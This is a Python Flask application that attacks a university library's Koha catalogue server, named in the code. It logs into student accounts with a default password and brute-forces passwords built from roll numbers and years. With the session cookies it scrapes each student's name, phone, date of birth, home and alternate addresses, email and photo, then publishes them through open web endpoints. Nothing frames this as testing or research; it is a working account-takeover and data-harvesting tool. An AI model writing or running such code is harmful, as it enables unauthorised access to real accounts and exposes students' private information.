import random
import json
import requests
from bs4 import BeautifulSoup
import re
from flask import Flask, jsonify, render_template, Response, request
import os

def generate_roll_no():
    prefixes = [
        "CSB23", "ECB23", "MEB23", "CEB23", "FEB23", "EEB23",
        "CSB24", "ECB24", "MEB24", "CEB24", "FEB24", "EEB24",
        "DBD24","SOM24","EGI23","EGI24"
    ]

    prefix = random.choice(prefixes)
    roll = random.randint(1, 83)

    return f"{prefix}{roll:03d}"

def photo(session_id):
    r = requests.get(
        "http://agnee.tezu.ernet.in:8999/cgi-bin/koha/opac-patron-image.pl",
        cookies={"CGISESSID": session_id},
        stream=True
    )

    return Response(
        r.content,
        content_type=r.headers.get("Content-Type", "image/jpeg")
    )

def fetch_profile(session_id):
    session = requests.Session()

    headers = {
        "User-Agent": "Mozilla/5.0"
    }

    profile_url = "http://agnee.tezu.ernet.in:8999/cgi-bin/koha/opac-memberentry.pl"

    try:
        response = session.get(
            profile_url,
            headers=headers,
            cookies={"CGISESSID": session_id},
            timeout=10
        )

        response.raise_for_status()

        html = response.text
        soup = BeautifulSoup(html, "html.parser")

        result = {
            "roll_no": None,
            "name": None,
            "primary_phone": None,
            "picture_url": f'/photo/{session_id}'
            }

        # Name
        user_label = soup.select_one(".userlabel")
        if user_label:
            text = user_label.get_text(" ", strip=True)
            text = re.sub(r"^Welcome,\s*", "", text)
            result["name"] = text

        # Roll No
        card_label = soup.find(
            "label",
            string=lambda x: x and "Library card number" in x
        )

        if card_label:
            parent = card_label.parent
            text = parent.get_text(" ", strip=True)

            match = re.search(r'([A-Z]{3}\d{5})', text)
            if match:
                result["roll_no"] = match.group(1)

        # Primary Phone
        phone_input = soup.find("input", {"id": "borrower_phone"})
        if phone_input:
            result["primary_phone"] = phone_input.get("value")

        # Only return if something was found
        if any([
            result["roll_no"],
            result["name"],
            result["primary_phone"]
        ]):
            return result

        return None

    except Exception as e:
        print("Error:", e)
        return None


import re
import requests
from bs4 import BeautifulSoup


def fetch_extensive_profile(session_id):
    session = requests.Session()

    headers = {
        "User-Agent": "Mozilla/5.0"
    }

    profile_url = "http://agnee.tezu.ernet.in:8999/cgi-bin/koha/opac-memberentry.pl"

    try:
        response = session.get(
            profile_url,
            headers=headers,
            cookies={"CGISESSID": session_id},
            timeout=10
        )

        response.raise_for_status()

        soup = BeautifulSoup(response.text, "html.parser")

        def get_input_value(field_id):
            field = soup.find(id=field_id)
            if field:
                return field.get("value", "").strip() or None
            return None

        def get_textarea_value(field_id):
            field = soup.find(id=field_id)
            if field:
                return field.text.strip() or None
            return None

        result = {
            "roll_no": None,
            "name": None,
            "primary_phone": None,
            "picture_url": f"/photo/{session_id}",

            "date_of_birth": None,

            "main_address": {
                "street_number": None,
                "address": None,
                "address_2": None,
                "city": None,
                "state": None,
                "zip_postal_code": None,
                "country": None
            },

            "alternate_address": {
                "address": None,
                "address_2": None,
                "city": None,
                "state": None,
                "zip_postal_code": None,
                "country": None,
                "phone": None,
                "email": None,
                "contact_note": None
            }
        }

        # Name
        user_label = soup.select_one(".userlabel")
        if user_label:
            text = user_label.get_text(" ", strip=True)
            text = re.sub(r"^Welcome,\s*", "", text)
            result["name"] = text

        # Roll Number
        card_label = soup.find(
            "label",
            string=lambda x: x and "Library card number" in x
        )

        if card_label:
            parent = card_label.parent
            text = parent.get_text(" ", strip=True)

            match = re.search(r"([A-Z]{3}\d{5})", text)
            if match:
                result["roll_no"] = match.group(1)

        # Primary Phone
        result["primary_phone"] = get_input_value("borrower_phone")

        # Date of Birth
        result["date_of_birth"] = get_input_value("borrower_dateofbirth")

        # Main Address
        result["main_address"]["street_number"] = get_input_value(
            "borrower_streetnumber"
        )
        result["main_address"]["address"] = get_input_value(
            "borrower_address"
        )
        result["main_address"]["address_2"] = get_input_value(
            "borrower_address2"
        )
        result["main_address"]["city"] = get_input_value(
            "borrower_city"
        )
        result["main_address"]["state"] = get_input_value(
            "borrower_state"
        )
        result["main_address"]["zip_postal_code"] = get_input_value(
            "borrower_zipcode"
        )
        result["main_address"]["country"] = get_input_value(
            "borrower_country"
        )

        # Alternate Address
        result["alternate_address"]["address"] = get_input_value(
            "borrower_B_address"
        )
        result["alternate_address"]["address_2"] = get_input_value(
            "borrower_B_address2"
        )
        result["alternate_address"]["city"] = get_input_value(
            "borrower_B_city"
        )
        result["alternate_address"]["state"] = get_input_value(
            "borrower_B_state"
        )
        result["alternate_address"]["zip_postal_code"] = get_input_value(
            "borrower_B_zipcode"
        )
        result["alternate_address"]["country"] = get_input_value(
            "borrower_B_country"
        )
        result["alternate_address"]["phone"] = get_input_value(
            "borrower_phonepro"
        )
        result["alternate_address"]["email"] = get_input_value(
            "borrower_email"
        )
        result["alternate_address"]["contact_note"] = (
            get_textarea_value("borrower_contactnote")
        )

        return result

    except Exception as e:
        print("Error:", e)
        return None

def login(username, password = "xyz"):
    url = "http://agnee.tezu.ernet.in:8999/cgi-bin/koha/opac-user.pl"

    # Matching your exact request headers
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "http://agnee.tezu.ernet.in:8999",
        "Connection": "keep-alive",
        "Referer": "http://agnee.tezu.ernet.in:8999/cgi-bin/koha/opac-main.pl?logout.x=1",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    data = {
        "koha_login_context": "opac",
        "userid": username,
        "password": password
    }

    # requests automatically sets Content-Type to application/x-www-form-urlencoded
    # and calculates Content-Length when using the `data` parameter.
    response = requests.post(
        url,
        headers=headers,
        data=data,
        allow_redirects=False
    )
    return response

def BruteForceLogin(username, upper = None, lower = None):
    if upper is None and lower is None:
        response = login(username)
        if response.status_code == 303:
            return response
        else:
            return None
    
    for i in range(lower,upper+1):
        response = login(username, f'LIB{username[-3:]}{i}')
        if response.status_code == 303:
            return response
            
    return None


def getProfileDetails():
    roll_no = generate_roll_no()
    auth_detils = login(roll_no)
    session_id = auth_detils.cookies.get("CGISESSID")
    profile = fetch_profile(session_id)
    if profile.get("roll_no") is None:
        return getProfileDetails()
    else:
        return profile

app = Flask(__name__)


@app.route("/")
def home():
    return render_template("index.html")

@app.route("/student-details")
def fetchStudentDetails():
    return render_template("student_details.html")

@app.route("/profile")
def profile():
    profile = getProfileDetails()
    if profile:
        return(json.dumps(profile, indent=2))
    else:
        return("null")
    
@app.post("/fetch-profile")
def fetchProfile():
    data = request.get_json()

    roll_no = data.get("roll_no")
    year_lower = data.get("year_lower")
    year_upper = data.get("year_upper")
    auth_detils = BruteForceLogin(roll_no, year_upper, year_lower)
    if auth_detils is None:
        return {"message": "Failed"}
    session_id = auth_detils.cookies.get("CGISESSID")
    profile = fetch_extensive_profile(session_id)
    return(json.dumps(profile, indent=2))


@app.route("/photo/<session_id>")
def photo(session_id):
    r = requests.get(
        "http://agnee.tezu.ernet.in:8999/cgi-bin/koha/opac-patron-image.pl",
        cookies={"CGISESSID": session_id},
        stream=True
    )

    return Response(
        r.content,
        content_type=r.headers.get("Content-Type", "image/jpeg")
    )


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(
        host="0.0.0.0",
        port=port,
        debug=False
    )
